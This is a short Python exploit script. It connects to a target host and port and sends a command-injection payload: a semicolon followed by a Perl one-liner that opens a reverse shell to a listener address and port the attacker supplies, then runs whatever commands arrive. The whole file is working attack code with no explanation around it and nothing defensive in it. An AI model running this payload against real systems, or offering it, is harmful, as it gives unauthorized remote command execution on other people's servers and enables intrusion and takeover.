#!/usr/bin/env python3
import argparse
import socket

parser = argparse.ArgumentParser()

parser.add_argument("target", help="Target IP address.")
parser.add_argument("tport", help="Target port number.", type=int)
parser.add_argument("listen", help="Listen IP address.")
parser.add_argument("lport", help="Listen port number.", type=int)

args = parser.parse_args()

target = args.target    # Target IP address
tport = args.tport      # Target port number
listen = args.listen    # Listen IP address
lport = args.lport      # Listen port number

# Establish connection with the target
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, tport))
data = s.recv(1024)

# Send the payload
payload = "AB;perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\"" + listen + ":" + str(lport) + "\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'"
s.sendall(payload.encode())